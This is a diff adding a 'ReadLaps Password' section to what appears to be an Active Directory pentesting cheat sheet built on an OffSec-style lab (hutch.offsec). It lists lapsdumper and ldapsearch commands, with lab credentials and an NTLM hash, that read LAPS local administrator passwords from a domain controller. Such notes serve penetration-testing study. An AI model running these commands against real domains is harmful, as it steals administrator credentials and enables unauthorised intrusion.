@@ -185,6 +185,13 @@ Calculating hashes for Current Value
 [*]       aes256_cts_hmac_sha1 : D3C18DAF21128CAFEAECE5BFF6599A0A4DFB2E9BE22F6CFE13677688B0A34988
 [*]       des_cbc_md5          : 0804169DCECB6102
 ```
+##### ReadLaps Password
+>LAPS allows you to manage the local Administrator password (which is randomized, unique, and changed regularly) on domain-joined computers. These passwords are centrally stored in Active Directory and restricted to authorized users using ACLs. 
+```
+lapsdumper -u fmcsorley -p CrabSharkJellyfish192 -d hutch.offsec -l 192.168.153.122
+lapsdumper -u user -p e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c -d domain.local -l dc host
+ldapsearch -v -c -D fmcsorley@hutch.offsec -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -H ldap://192.168.153.122 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
+```
 ### Authentication
 ###### Minikatz(require local admin)
 Load DemoEXE and run it locally.  
